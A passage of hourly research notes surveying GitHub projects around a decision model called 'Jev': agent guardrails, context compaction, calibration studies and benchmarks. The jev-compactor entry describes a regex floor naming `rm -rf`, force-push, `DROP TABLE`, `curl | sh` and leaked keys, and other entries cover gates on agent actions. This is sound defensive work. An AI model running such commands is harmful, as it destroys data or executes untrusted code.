   role / name / value / checked / options / path; ~1.6
   KB ≈ 400 tokens) in; one request answers **operation**
   (`click` / `type_text` / `select` / `scroll_*` /
   `wait` / `done` / `blocked`) **and** per-op **target**
   heads (speculative, mutually invisible; each head lists
   only compatible elements). Code owns observation,
   execution, stale-ref check, loop protection, exit, and
   space teardown. Architecture cousin of
   [jev-ultrafast](https://github.com/browser-use/jev-ultrafast)
   (dynamic operation+target; code-side option index).
   Distinct from JevOnly (no planner LLM, Chromium harness),
   waymode (host-owned product handlers), Stagehand (LLM
   fallback), gliner2-ultrafast / Cua-S1 (other backends).
   **Not** a planner replacement: Jev does not generate
   text or do business judgment. Optional OpenAI-compat
   text model only when `--text` candidates are absent;
   malformed JSON → `text_model_failed`, **does not guess
   a fill value**. `--until` (URL substring / code
   `check`) is the **deterministic** success condition;
   Jev self-`done` is weaker. `done`/`blocked` are
   operations, not probability thresholds. Jev finishing
   **≠** business-correct. Do not copy `install.sh` /
   `~/.config/typesafe/api_key` (ego runtime drops parent
   env — that is *their* pitfall, not ours).

   **Measured *theirs* (2026-09-19; macOS; ego lite
   0.5.0.32; `jev-1.13`; alternate 3 rounds, medians):**

   | Task | ego-jev | per-step LLM loop (`kimi-k3`) |
   |---|---:|---:|
   | HN two-step nav | **4.9 s** (1 process, 12 browser calls) | **9.7 s** (3 processes) ~2.0× |
   | Wikipedia search (both generate text) | **5.4 s** (1 step) | **10.1 s** (2 processes) ~1.9× |

   Jev 1.0–1.5 s/decision vs frontier 1.6–4.5 s. Browser
   actions not saved (both snapshot + evaluate). **n=3
   pairs/task, high variance** (control 7.3–22 s) — not a
   benchmark. Selector-hardcoded code beats both. Known
   limits *theirs*: native dropdowns that need a confirm
   click `stuck`; custom-styled checkboxes missing from
   a11y snapshot; auto-translate breaks UI-string
   `--until`. Real captcha/login-wall untested.

   **Hunch / Augustus takeaway:** System One on the hot
   click path; generation only where text must be written.
   Code owns observe / execute / verify / exit. Same
   observe→score-among-candidates→code-acts hole as
   jev-ultrafast, class-backend-agnostic.

2. **[`edwardyen724-g/jev-compactor`](https://github.com/edwardyen724-g/jev-compactor)**
   (TypeScript; MIT; created 2026-09-19T03:31:54Z; **1★**;
   GitHub `size` 0 this pass — README 20,949 B and
   packages are live). **Was empty skip in §61; content
   landed.** Framework-agnostic context compaction +
   safety gating (OpenAI / Anthropic / LangChain / plain
   `{role,content}` / CLI / MCP). Slogan: **"Jev judges
   relevance. Code decides structure."** Keep original
   messages **byte for byte**; never rewrite; every drop
   carries a reason + probability; tool call↔result pairs
   never split. Pre-pass in code: pin system / recent /
   goal-path / code; dedup; **regex floor** (`rm -rf`,
   force-push, `DROP TABLE`, `curl | sh`, leaked keys)
   independent of Jev. One Jev request: keep/drop Choice
   per candidate + Foreman Nouls (destructive /
   exfiltration / thrashing / goal-drift). Drop only if
   P(drop) ≥ 0.7. Dual fail polarity: compaction **fails
   open** if Jev is down (`skipped = jev_unavailable`;
   history unchanged) unless `failClosed`; safety gate
   **fails closed** on pending-action destructive /
   exfil (`CompactionBlockedError` / escrow). Contrast
   gliner25-compaction fail-closed `keep_full` (the
   *reduction* is the irreversible act). Claude Code
   shorter path remains
   [fast-jev-compaction](https://github.com/tamaratran/fast-jev-compaction).
   OpenCode V2 fail-open port already §62 MED:
   [fast-jev-opencode](https://github.com/nrdz-labs/fast-jev-opencode).
   Do not copy npm / pnpm / `.env`. Data leaves the
   machine on a compaction (abridged copy to TypeSafe).

   **Measured *theirs* (`docs/BENCHMARK.md`; 2026-09-18;
   `jev-1.13.0`; one synthetic 64-message / 12.7k-token
   session; 6k budget):**

   | Arm | saved | latency | cost | hallucinated paths | early facts kept |
   |---|---:|---:|---:|---:|---:|
   | jev-compactor | **64.5%** | **366 ms** | **$0.0004** | **0** | **4 of 4** |
   | truncate oldest | 53.0% | 1 ms | $0 | 0 | 1 of 4 |
   | Claude Sonnet 5 summarize | 96.2% | 6.1 s | $0.0305 | 1 | 3 of 4 |

   One session, reproducible, **not a survey**. P(keep)
   moved ≤0.14 across four identical requests; units near
   0.7 can flip (2/9 transcript-runs).

   **Hunch / Augustus takeaway:** pointer not summarizer,
   now as middleware with a same-pass safety sensor.
   Regex proves the cheap floor; Jev is the remainder.
   Compaction fail-open vs gate fail-closed is per-act,
   not a global virtue. Compose with actiongate: Jev
   supplies evidence; code owns authority (and structure).

3. **[`zhuyansen/x-reply-filter`](https://github.com/zhuyansen/x-reply-filter)**
   (JavaScript; MIT; created 2026-09-19T06:07:18Z; 0★;
   homepage `https://xrf.ship2market.ai/`). Chrome MV3:
   collapse (do not delete) low-quality X replies on
   status pages. **Two-tier:** (1) local `rules.js` zero
   cost (promo, crypto shill, AI-tool pitch, bait, emoji-
   only, "first", link-only, bot-looking handles); (2)
   remainder batched 8 → four Nouls (promo/spam, bait,
   off-topic, AI filler); any ≥ 0.75 (default) collapses.
   Cache by tweet id. Cousin of
   [bohutang/sift](https://github.com/bohutang/sift)
   (§62 MED X-feed labels/hide) — this one is a **product
   pattern**: structural prove ∩ remainder + a **feedback
   loop that does not auto-train on the model's own
   hides**. Auto-collapses land in "recent auto-hides"
   until the user confirms "yes, hide" or "wrong, keep";
   only confirmed examples become few-shot (10 junk / 10
   keep) plus an extra Noul "same class as user-marked
   junk." E2E *theirs* (`test/examples.e2e.js`): three
   "reset request" samples → similar replies 0.90 / 0.93
   vs normal questions 0.08 / 0.10. Samples stay on-device
   (`chrome.storage.local`). ~$0.00006 / 8-pack; 10k
   replies ~$0.08 *theirs*. DOM `data-testid` coupled.
   Do not copy wrangler / OpenRouter / Worker deploy.

   **Hunch / Augustus takeaway:** cheap cookbook for
   hold-before-show: local rules prove the easy junk;
   decision model on the remainder; **never let the
   model's own negatives reinforce the model**. Distinct
   from distilling Jev as teacher of record (jev-triage
   ~68% ceiling) — here the poison is self-labeled
   *hides*, not a teacher copy.

### Skip / already folded

- actiongate-jev, jev-packs, does-jev-confidence: §64.
  One-line compose: ego-jev and jev-compactor both keep
  **code as authority** (observe/execute/structure/regex
  floor); Jev is the sensor.
- sysone-help/sysone: §63 MED (evaluation-model-first
  TS library). No new substance this pass.
- nrdz-labs/fast-jev-opencode: §62 MED. Fail-open
  OpenCode V2 port of fast-jev-compaction; not a second
  compaction species.

### Curated status (same hour as §64; not re-derived)

- Awesomejev **flat 488/21644**.
- Live SemIf **1660★** (+8). jevlike **910★** (+5).
  TypeAR 9. Tracker likes **42**; lastModified
  unchanged. Laya yes. Blackwood ABSENT.
- Archer still **NOT landed**. X MCP still flapping.

### Omni / Jev-omni / Archer

Still **WATCH**. A hot-click CU loop, a compaction
middleware, and a reply filter are **not** that drop.

### Cross-links

Cards: `applied-mappings.md` §1 (jev-compactor verbatim
compact + regex floor + dual fail polarity), §2 / §9
(ego-jev hot-click CU), §4 (x-reply-filter local rules
then remainder; anti-self-train); `mappings.md` §18
(structural prove ∩ remainder); `mixed-architecture.md`
(fail table + gallery); `validation.md` (ego-jev n=3
medians; jev-compactor 64.5%/366ms one session);
`faq.md` (Jev `done` ≠ success; never auto-train on
own hides; compaction still must not summarize);
`mental-models.md`; `methods-catalog.md`;
`toolbox-mapping.md`; `agent-self-assessment.md`.
Hunches labeled. No wrapper.

## 66. Hourly 01:47 Boise: control-plane combinators, receipts-not-leaderboard, skill VOI, OOD/AUC≠ECE, frontier-100 Harbor, turnstile evidence≠authority, MLX one-pass economics (2026-09-19)

America/Boise 01:47 = 2026-09-19T07:47Z. Docs-only fold into open
PR #2 (`cursor/augustus-store-envelope-00b4`). Not a competing PR.
Archer 27B drop still **WATCH**. Identity lock vs `typesafe-ai` /
`tenbin` / `decision-first` holds. No wrapper, no npm / cargo /
pip / bun how-to. No invented metrics. Do **not** re-fold
§50–§65 HIGH except one-line. Atlas extractable-from-state axis
already §49 — this hour is the **eval-integrity cluster**, not a
rehash of the history suite. Skillranker was a §7 deep-read
(findings said fail-closed) — this hour folds the **control-plane
/ VOI** reading and corrects the hook polarity. jevmlx was a
§1 reverse-engineering mention — this hour is the **productized
Apple Silicon one-pass** card. TypeSafe Jev is the documented
exemplar, not the monopoly. Augustus stays how-to-apply / mental
model / architecture / toolbelt + jevals/Harbor practice.

Watch archive path `/workspace/jev-archive/2026-09-19/0147`
is **not present** on this VM. Receipts this pass are live
GitHub READMEs + `gh api` metadata (2026-09-19 ~07:53Z).
Causes below are **hunches** unless labeled Empirical.

Three clusters, not a hit list:

- **(a) Gate doctrine clones.** Turnstile joins actiongate:
  deterministic policy first; Jev is semantic evidence;
  evidence ≠ authority; receipts + replay.
- **(b) Composition primitives.** Combinators + skillranker =
  System One as a **control plane**, not chat turns: named
  circuit combinators over typed judgments; VOI over a live
  skill library with abstention.
- **(c) Eval integrity without leaderboard theater.** Atlas
  (receipts, not a ranking) + frontier-100 (Harbor-shaped
  Jev vs thinking-budget small models) + OOD calibration
  (AUC ≠ ECE; sign of miscalibration by type).

Plus local replica economics: jevmlx one-pass schema→JSON+probs
on Apple Silicon (softmax ≠ Noul).

### HIGH

1. **[`voidning/decision-combinators`](https://github.com/voidning/decision-combinators)**
   (TypeScript; README/package.json **MIT**; GitHub SPDX **null**
   this pass; created 2026-09-19T07:25:16Z; 0★; GitHub `size` 0
   — `src/` and README are live). Composable decision circuits
   for Jev **and other judgment primitives**. Slogan: primitives
   = transistors; combinators = logic gates; decision graph =
   chip; confidence = current; trace = oscilloscope. The five
   combinators are **Then / Gate / Vote / Cascade / Weighted**
   — not a new Jev API and **not** literal Boolean AND/OR
   operators. AND/OR aggregation of parallel Nouls still lives
   in code (`composition-algebra.md`: do not multiply). Vote
   is majority or mean with confidence discounted by agreement.
   Cascade is cheap→expensive, stop when confident. Gate is
   confidence routing. Optional `@typesafe-ai/sdk` peer.
   No published measurements. Do not copy `npm install` /
   `pnpm dev`.

   **Hunch / Augustus takeaway:** System One decisions compose
   as **control-plane primitives**, not chat turns. The library
   is a named algebra over Choice/Score/Noul; policy, fail
   polarity, and independence caveats stay yours.

2. **[`Zaious/jev-capability-atlas`](https://github.com/Zaious/jev-capability-atlas)**
   (Python; README MIT / GitHub SPDX **NOASSERTION**; created
   2026-09-18T21:30:40Z; **10★** this pass, was 0★ at §49;
   pushed 2026-09-19T07:23:02Z). Already folded as the
   extractable-from-state **boundary map** (`notes.md` §49;
   history suite N=3). **Do not rehash that table.** This
   hour's job is the **eval-integrity** reading: an independent
   hold-vs-break map with **API receipts**, not a leaderboard
   (they cite jev-benchmarks / thaiexam, they do not redo them).
   Jaggedness slogan now explicit in the README: schema-valid
   (cannot emit off-list) **≠** correct (DAIR Emotion 48% acc
   at mean conf 0.819). Same type-safe ≠ correct as interlock,
   now as a **measurement** claim rather than a kernel claim.
   Receipts-first CONTRIBUTING. Unofficial, not TypeSafe.

   **Hunch / Augustus takeaway:** capability claims need
   receipts. A leaderboard without a hold/break axis is
   theater. Compose with frontier-100 and ood-calibration
   as one eval-integrity cluster.

3. **[`Dicklesworthstone/skillranker`](https://github.com/Dicklesworthstone/skillranker)**
   (Rust; README MIT + OpenAI/Anthropic rider / GitHub SPDX
   **NOASSERTION**; created 2026-09-17T06:58:19Z; **52★**;
   pushed 2026-09-19T07:48:57Z). Previously analyzed §7 /
   findings #4 as "hook ranks skills, calibration loop,
   fail-closed." **Correction this pass:** the Claude
   **prompt-hook maps recommendation failures to quiet
   exit-zero** — it **never blocks the agent** (fail-open
   for the hook). CLI keeps meaningful exit codes. Jev
   two-pass: wide Choice over candidates then fit Nouls on
   a shortlist; both include a real **"none of these"**.
   Advisory: the agent follows user instructions. Libraries
   >254 eligible skills: **Quill** lexical prefilter
   (FrankenSearch) admits ≤254 + none to each Choice.
   Explicit skill requests resolve locally first. Local
   feedback / replay without a new Jev call. Builds on the
   official skill_suggestion cookbook; adds session identity,
   harness visibility, bounded execution. Do not copy cargo /
   TypeSafe key paths.

   **Hunch / Augustus takeaway:** VOI over a skill library —
   pay to load a skill iff it changes the next step; abstention
   is first-class. Compose with combinators: rank/select is a
   control-plane act, not a chat turn. Distinct from
   skill-broker (outline; Jev never grants access).

4. **[`scienthoon/jev-ood-calibration`](https://github.com/scienthoon/jev-ood-calibration)**
   (Python; MIT; created 2026-09-19T07:33:22Z; 0★; GitHub
   `size` 0 — README + scripts live). Independent calibration
   on a task Jev cannot have seen, plus three public
   benchmarks it probably has. Vercel AI Gateway
   `typesafe-ai/jev` (Gateway does not expose a model
   version; `jev-latest` id returned "Model not found");
   AI SDK 7.0.107; `zeroDataRetention: true`; 2026-09-19;
   3,721 public + 900 synthetic; 0 failed calls; ~$0.06.
   ECE at T=1, 15 equal-width bins on max-probability.
   **Refit T** is diagnostic (T>1 overconfident; T<1
   underconfident) and carries a **sign that scalar ECE
   does not**.

   **Public (likely in-domain; contamination unknowable):**

   | Dataset | n | Acc | NLL | ECE | ECE/floor | Refit T |
   |---|---:|---:|---:|---:|---:|---:|
   | OpenBookQA val | 500 | 94.2% | 0.172 | 0.024 | 1.0× | 0.96 |
   | CommonsenseQA val | 1,221 | 88.1% | 0.395 | 0.032 | 1.7× | 1.35 |
   | HellaSwag val 2k | 2,000 | 86.1% | 0.420 | 0.029 | 1.6× | 1.00 |

   **Synthetic support tickets (rule-generated 2026-09-19;
   5% labels randomly corrupted; cannot be in training):**

   | Question | Type | n | Acc | ECE | Refit T | Reading |
   |---|---|---:|---:|---:|---:|---|
   | Which queue? | choice (4) | 300 | 89.0% | 0.082 | **3.29** | Right, but wrong answers also get 1.00 |
   | Customer angry? | boolean | 300 | 91.7% | 0.079 | **0.66** | Underconfident |
   | Priority (org rule) | score (4) | 300 | 44.7% | 0.325 | **3.40** | Cannot know; mean stated p **0.74** |
   | All | | 900 | 75.1% | 0.107 | **2.74** | 4.4× noise floor 0.024 |

   Priority = template urgency + angry + gold/enterprise tier
   **clipped** — the tier bump is organisational policy **absent
   from the text**. 44.7% is chance plus common sense. The
   question is whether probabilities *reflect* that it cannot
   know. They do not. TypeSafe `confidence` ECE is **worse**
   than max-probability on these sets (0.18 synthetic) — do
   not threshold on it. Probabilities quantised to 0.01;
   OpenBookQA: 1,051 of 2,000 option p exactly 0; one item
   assigned 0.00 to the correct answer (counterexample to
   "no misses at confidence 1.000"). **Sign of miscalibration
   differs by type** on the same tickets: Choice/Score
   overconfident, boolean underconfident. Calibrate per
   question, not per model. Complements does-jev-confidence
   (ranking ≠ calibration on in-domain humans) and dinostomp
   (instrument). One synthetic family; Gateway slug may move.
   Do not copy npm / Gateway key.

   **Hunch / Augustus takeaway:** AUC ≠ ECE. In-domain honesty
   does not license OOD thresholds. An unknowable policy
   label is the human-routing case the product actually
   depends on.

5. **[`softpudding/jev-frontier-100`](https://github.com/softpudding/jev-frontier-100)**
   (Python; MIT; created 2026-09-19T07:12:41Z; 0★; GitHub
   `size` 0 — questions, protocol, results live). 100 original
   four-choice tasks (10 domains; 50 counterfactual pairs;
   60 executable-oracle; 30/40/30 easy/medium/hard —
   difficulty **not independently calibrated**; no independent
   expert review). Jev vs Qwen3.5 0.8B / 2B / 4B across
   thinking **off / 512 / 2048**. 100×3 trials; all 3,000
   retained responses valid; no majority vote. Exploratory
   release: published conditions **selected after observing
   results**, not a blind preregistration. Measured *theirs*
   (Apple M5 Max, Q8_0, `jev-1.13.0`):

   | Thinking budget | 0.8B | 2B | 4B |
   |---|---:|---:|---:|
   | Off | 38.0% | 48.0% | 56.0% |
   | 512 | 39.0% | 59.7% | 78.3% |
   | 2,048 | 54.0% | 82.0% | **96.7%** |

   **Jev 77.0%.** 4B/2048 exceeds Jev by 19.7 pp (95% paired-
   template bootstrap **+12.7 to +26.7**). 2B/2048 +5.0
   (−2.3 to +12.3) — descriptive, not a proof of equivalence.
   **Budget matters:** 4B with thinking off is 56.0%; at 512
   it is 78.3%. "Jev is weaker than a 4B model" needs the
   thinking condition attached. Similar totals ≠ similar
   skills (Jev stronger on short code semantics / formal
   logic; 2B/2048 on relationship tracking / algorithms).
   Qwen score is raw probability of the emitted letter
   token — **not** normalized over four choices, not
   automatically P(correct). Jev confidence is a different
   definition. Does **not** establish a universal
   intelligence ceiling. Harbor/jevals-shaped: frozen
   questions, published protocol, recompute-from-logs,
   honest limits. Do not copy Ollama / llama-server /
   `JEV_KEY`.

   **Hunch / Augustus takeaway:** a Harbor comparison without
   the compute-budget axis is a slogan. Attach the thinking
   condition. Not a leaderboard.

6. **[`zyphr-labs/turnstile`](https://github.com/zyphr-labs/turnstile)**
   (TypeScript; Apache-2.0; created 2026-09-19T07:16:52Z;
   0★; GitHub `size` 0 — engine + docs live). Guardrails for
   an agent's next action: deterministic policy + Jev
   semantic checks + replayable receipts. Returns
   `allow` / `review` / `deny`. **Experimental alpha**;
   runs from source with Bun; **no published npm package**.
   First integration: Claude Code (observe mode + Jev
   disabled by default). Not an endpoint sandbox; not OS
   permissions. Decision path: match tool + argument
   constraints → if policy permits, require a nonempty
   goal and Jev → compare each risk probability to
   thresholds → receipt. **Jev never grants authority that
   policy denied.** Explicit review stays review. Model
   checks run only after deterministic permission succeeds.
   Starting thresholds *theirs* (not calibrated): any
   semantic score ≥0.85 deny; ≥0.35 review; all <0.35
   allow; missing goal / disabled Jev / timeout / invalid
   → **Review**. Replay recomputes thresholds on saved
   scores with **no new model calls**; hard denials stay
   hard. Demo uses **fixed judgments** (no API key) —
   demonstrates enforcement, not accuracy. Distinct from
   actiongate-jev (OpenRouter; six Nouls; fail-closed
   financial if Jev down) — same doctrine, different
   product (Claude adapter, observe/enforce, replay CLI).
   Distinct from construct / toolgate / greenlight /
   interlock. Do not copy bun / `.turnstile/` how-to.
   Enabling Jev sends goal/tool/args to TypeSafe.

   **Hunch / Augustus takeaway:** gate-doctrine clone of
   actiongate. Evidence ≠ authority. Receipts make
   threshold policy inspectable without re-judging
   content.

7. **[`bnsd55/jevmlx`](https://github.com/bnsd55/jevmlx)**
   (Python; MIT; created 2026-09-17T10:20:12Z; **28★**;
   pushed 2026-09-19T07:47:10Z). Mentioned in §1 as
   reverse-engineering (prefill-once + typed option
   logits). This hour is the **productized** card: typed
   decisions from any MLX instruct model on Apple Silicon;
   schema of booleans / enums / multi-selects → JSON
   **valid by construction**, probability per field, **one
   batched forward pass**. Started from
   rorshopping/jev-on-a-laptop; descends from
   harshatheg/Qwen-2.5-1B-RLCD (demo, no weights).
   Default alias `quality` =
   `mlx-community/Qwen2.5-7B-Instruct-4bit`. Optional
   OpenAI-compat backend: **one request per field**,
   top-k truncated. Calibration CLI (ECE), abstention /
   none-of-above, constrained MAP. **Not TypeSafe Jev.**
   Softmax over allowed tokens ≠ Noul. Leaderboard cites
   TypeSafe official 67.8%; **no local results yet**.
   Distinct from system-one-benchmark (Harbor n=50 Jev vs
   MLX PCD Brier table) — this is a library, that is a
   bake-off. Distinct from pcdServer / TypeAR / jevify.
   Do not copy `pip install git+` / `./setup.sh`.

   **Hunch / Augustus takeaway:** Apple Silicon System One
   *replica economics* — schema-valid one-pass is newly
   feasible locally; calibration is still your job. Do not
   launder a field probability as a hosted Noul.

### MED (brief)

- **[`chopratejas/invalidate`](https://github.com/chopratejas/invalidate)**
  (Python; Apache-2.0; created 2026-09-19T04:26:59Z; **5★**).
  Memory leases: every fact is stored verbatim; new evidence
  can end it; questions/plans/directives are not evidence;
  unsure → review queue. Six named Nouls per fact×event,
  then **fixed rules in code**. Eval *theirs* 157 labeled
  cases: **89.2%** strict / **97.5%** lenient / **0 of 157**
  false invalidations; ~$0.00006 per fact×event. Adapter
  in front of Mem0/Chroma/LangGraph/Markdown — host keeps
  the store. **Hunch:** VOI/selective-memory cousin of
  carryforward; leases are code; Jev is the sensor that
  a new event might retire a fact. Do not copy pip.

- **[`yottayoshida/jev-intent-review`](https://github.com/yottayoshida/jev-intent-review)**
  (license MIT; created 2026-09-19T07:45:28Z; 0★; language
  **null**; **under construction**, v0.1 in progress,
  nothing released). Diff-only review misses places the
  PR did not touch. Starts from stated intent, searches
  the repo after the change, one small Jev question per
  place → VERIFIED / VIOLATION / UNKNOWN / NOT_APPLICABLE.
  **Never claims that finding nothing means the code is
  correct.** Design in `docs/SPEC.md`. **Hunch:**
  intent-vs-whole-repo is a placement (∀ over found
  sites; aggregation in code); empty search ≠ proof.

- **[`shubhangi013/prune-review`](https://github.com/shubhangi013/prune-review)**
  (TypeScript; README Apache-2.0 / GitHub SPDX
  **NOASSERTION**; created 2026-09-19T07:48:06Z; 0★;
  source preview, packages/Action not published).
  Cost-aware PR review: Jev per hunk → drop trivial +
  **safety escarpment** always-keep → smaller packet to
  a generative reviewer. Jev does not generate comments.
  Target ~20% generative-cost cut. Bounded pilot *theirs*:
  15 of 22 paired runs saved; winning-only **27.9%**
  (post hoc); all 22 including one **305%** cost outlier
  **1.18%**; excluding that outlier **15.9%**. Cost
  results, **not quality claims**. Jev $0.00255 across
  22 runs. ONNX-local fallback. **Hunch:** same sieve as
  context compaction, on a review packet; report the
  outlier, not only the winners.

### Skip / already folded

- Atlas **axis** (history suite / extractable-from-state):
  §49. This hour adds the receipts-not-leaderboard /
  type-safe ≠ correct cluster reading only.
- Skillranker **existence**: §7. This hour adds VOI /
  abstention / hook fail-open correction.
- jevmlx **architecture reconstruction**: §1. This hour
  adds the productized one-pass economics card.
- actiongate-jev: §64. Turnstile is the clone, not a
  re-fold.
- does-jev-confidence: §64. OOD is the out-of-domain
  complement (AUC ≠ ECE already named; this hour adds
  **sign by type** and an unknowable policy label).
- system-one-benchmark MLX PCD: §61. jevmlx is the
  library; that row stays the Harbor Brier table.

### Curated status

Census **not re-derived** this hour. Last recorded §64/§65:
Awesomejev 488/21644; SemIf 1660 (+8); jevlike 910 (+5);
TypeAR 9; tracker likes 42. Archer still **NOT landed**.
No X discourse archived this pass.

### Omni / Jev-omni / Archer

Still **WATCH**. Combinators, a capability atlas, a skill
ranker, OOD ECE, a 100-task bake-off, a turnstile, and an
MLX library are **not** that drop.

### Cross-links

Cards: `applied-mappings.md` §5 (skillranker VOI), §7
(turnstile joins actiongate); `mappings.md` §3
(combinators as circuits), §6 (skill VOI), §7 (OOD sign
by type), §8 (evidence ≠ authority); `mixed-architecture.md`
(fail table + gallery); `validation.md` (ood tables;
frontier-100; atlas receipts); `faq.md` (control plane
not chat; AUC ≠ ECE; type-safe ≠ correct; thinking-budget
axis; local one-pass ≠ Noul); `judgment-class.md` (jevmlx);
`composition-algebra.md` (combinators sit on ∧/∨-in-code);
`mental-models.md`; `methods-catalog.md`;
`toolbox-mapping.md`; `agent-self-assessment.md`;
`formal-methods.md`. Hunches labeled. No wrapper.

## 67. Hourly 02:38 Boise: TLA+ compose with judgment (never confidently wrong), SEAL advance/coverage ledger, skill-broker sibling, sureness bands, JevBench v1.1 Harbor practice, CI typed gate, Codex MCP adapter (2026-09-19)

America/Boise 02:38 = 2026-09-19T08:38Z. Docs-only fold into open
PR #2 (`cursor/augustus-store-envelope-00b4`). Not a competing PR.
Archer 27B drop still **WATCH**. Identity lock vs `typesafe-ai` /
`tenbin` / `decision-first` holds. No wrapper, no cargo / pip /
npm / action.yml / config.toml how-to. No invented metrics. Do
**not** re-fold the 01:47 list (jevmlx, skillranker, atlas,
frontier-100, decision-combinators, turnstile, ood-calibration)
except one-line contrast. skill-broker existence already §62 —
this hour is the **sibling** reading vs turnstile / skillranker,
not a re-read of `PROJECT-OUTLINE.md`. TypeSafe Jev is the
documented exemplar, not the monopoly. Augustus stays
how-to-apply / mental model / architecture / toolbelt +
jevals/Harbor practice — not SWE-only, not a thin Jev skill.

Watch archive path `/workspace/jev-archive/2026-09-19/0238`
is **not present** on this VM. Receipts this pass are live
GitHub READMEs + `gh api` metadata (2026-09-19 ~08:45Z).
Causes below are **hunches** unless labeled Empirical.

Four clusters, not a hit list:

- **(a) Formal/semi-formal compose with judgment.** TLA+-checked
  consensus kernel around a live decision API; the invariant is
  *never confidently wrong* (escalate is allowed). Inverse of
  soundness theater: do not hard-gate a soft judgment without an
  escalation path.
- **(b) Advance/coverage ledger.** Jev answers questions; SEAL
  answers whether the world may change. Coverage path
  `{auto|code|human|escalate}` must be visible; mint ≠ product
  brain.
- **(c) Evidence ≠ authority siblings.** skill-broker (pre-agent
  grants in code) sits beside turnstile (runtime authorize after
  policy) and skillranker (advisory VOI rank). Same doctrine,
  different holes.
- **(d) Measurement practice without leaderboard theater.**
  Sureness over probability vectors (pair with OOD); JevBench
  v1.1 Harbor/jevals-shaped (calibration *reported, not scored*);
  cheap typed CI gate before expensive review; Codex MCP host
  adapter (ranking quality unbenchmarked).

### HIGH

1. **[`copyleftdev/jev-labs`](https://github.com/copyleftdev/jev-labs)**
   (Python; **MIT** README and LICENSE / GitHub SPDX **MIT**;
   created 2026-09-19T08:07:12Z; 0★; GitHub `size` 0 — tree is
   live). TLA+-model-checked consensus kernel around the live
   Jev API. Slogan: **Never confidently wrong.** Pharmacy
   scenarios are **synthetic** (unambiguous answers so the
   harness can detect protocol failures). Nothing here is
   clinical guidance or formulary-validated. Claims are about
   the **protocol under chaos**, not Jev's pharmaceutical
   competence.

   Golden rounds (pharmacist-without-hesitation cases), *theirs*:

   | chaos | n | correct | escalated | wrong | acc 95% CI |
   |---|---:|---:|---:|---:|---|
   | none | 360 | 360 | 0 | **0** | [0.989, 1.000] |
   | realistic | 360 | 360 | 0 | **0** | [0.989, 1.000] |
   | severe | 360 | 314 | 46 | **0** | [0.834, 0.903] |

   1,080 golden: **0** wrong. Rule of three: true violation rate
   bounded below **0.28%** at 95% — **does not prove the rate is
   zero**. Severe chaos raised escalation **5.0% → 18.0%**
   (z = 6.83): the kernel declines more as evidence degrades
   (designed direction). Total **1,680** rounds / 5,007 votes;
   **0** rounds aborted after they stopped fail-fast on transport
   (a lost agent is marked unavailable). Underdetermined-by-
   construction record: Jev escalated 86 of 120 and **decided 34,
   split both ways** — the stability gate is **not** an
   answerability check.

   Protocol: 5 agents, stability gate (margin must beat the
   measured **identity noise floor 0.042**), quorum **3 of 5**
   stable votes. TLC: 5 agents / quorum 3 / 2 crashes —
   **1,049,750** distinct states, **0** errors. Quorum bound
   derived by 24-config sweep: `safe iff 2Q > N and Q > 2f`. Two
   configs kept as deliberate failures. 1,490 hash-verified calls
   to `jev-1.13.0`: not deterministic (identical request 0.03 /
   0.03 / 0.03 / 0.04 / 0.04); noise floors identity 0.042 /
   reorder 0.059 / paraphrase cohort 0.073; calibration on 240
   constructed items accuracy **0.979** / Brier **0.0187** / ECE
   **0.075**. Latency flat in question count (1q 96.7 ms mean
   n=1,161; 38q 98.0 ms). Billing meter linear. Do not copy
   `verify.sh` / `TYPESAFE_API_KEY` / cargo.

   **Hunch / Augustus takeaway:** formal methods **compose** with
   a Jev-class sensor: TLA+ owns the protocol invariant; the
   decision model is the noisy oracle; **escalate** is the
   safety valve. Hard-gating a soft judgment without that path
   is soundness theater's inverse. Not a proof that Jev is never
   wrong.

2. **[`Reasonofmoon/seal`](https://github.com/Reasonofmoon/seal)**
   (Python; **MIT**; created 2026-09-19T08:10:05Z; 0★; GitHub
   `size` 0 — docs/src live; pushed 2026-09-19T08:45:45Z).
   Workflow kernel: **No seal, no advance.** Product truth as a
   sealed graph, not an agent parade and not Jev-with-UI. Zero
   runtime deps. Node optional for TypeSafe mint only.

   [`docs/BEYOND-JEV.md`](https://github.com/Reasonofmoon/seal/blob/main/docs/BEYOND-JEV.md)
   is the load-bearing mental model: **Jev answers questions;
   SEAL answers whether the world may change — and shows the
   exception queue.** Coverage Gate stamps every seal
   `coverage.path` ∈ `{auto | escalate | human | code}`. Hiding
   escalations is a product lie. Deterministic first: a free
   correct `if` beats a paid wrong mint (`provider: code:…`).
   **Mint ≠ product brain.** They refuse to claim SEAL is faster
   or cheaper than Jev, or that seals are always true. Public
   scorecards (LangChain / CrewAI / AutoGen / Vercel AI /
   TypeSafe SDK) fail `advance_gate` / `durable_ssot` /
   mint≠brain as *workflow-class* counters, not wrappers. Do
   not copy `scripts/demo.sh` / CI YAML.

   **Hunch / Augustus takeaway:** judgment and advance are
   different holes. A typed answer does not unlock an effect.
   Coverage path is the visible exception queue (Leveson sensor
   ≠ constraint, now as a ledger). Backend-agnostic: any
   Strike provider can fill a Candidate; only a Seal advances.

3. **[`adamjralph/skill-broker`](https://github.com/adamjralph/skill-broker)**
   (**delta, not a re-fold.** Existence already §62.
   Language **null**; GitHub SPDX **null**; created
   2026-09-19T04:35:59Z; 0★; 12 open issues; pushed
   2026-09-19T08:14:57Z). Still **project-definition**.
   README now exists and restates the outline: deterministic
   pre-agent intervention for Hermes; Jev scores
   relevance/confidence only; **authority/limits live in
   code — never grants access**. Foundation-only on Jev
   down; never broaden. Replayable route evidence. `docs/adr`
   / `CONTEXT.md` appeared; no shipped runtime. Distinct from
   jev-hermes (route ≠ memory).

   **Sibling contrast this hour (do not merge products):**

   | hole | who owns authority | Jev's job | fail |
   |---|---|---|---|
   | [turnstile](https://github.com/zyphr-labs/turnstile) §66 | policy first; runtime ALLOW/REVIEW/DENY | remainder after permit | missing Jev → Review |
   | [skillranker](https://github.com/Dicklesworthstone/skillranker) §66 | agent/user (advisory) | VOI rank + none-of-these | hook **fail-open** |
   | skill-broker §62/§67 | catalog/policy **grants** in code | relevance/confidence over authorised candidates | fail-closed to foundation-only |

   **Hunch:** same evidence≠authority doctrine as turnstile /
   actiongate, on the *skill-injection* hole rather than
   tool-authorize. Still not a production recipe. Do not copy
   an install.

4. **[`adarc8/how-sure-is-jev`](https://github.com/adarc8/how-sure-is-jev)**
   (Python; **MIT**; created 2026-09-19T08:00:28Z; 0★; GitHub
   `size` 0). Zero-dep sureness over Jev probability vectors.
   Metrics (each maps a distribution to `[0,1]`; flat = 0, all
   mass on one option = 1): `max_prob`, `margin`, `entropy`,
   `gini`, `perplexity`, plus `spread` (Score, ordered levels)
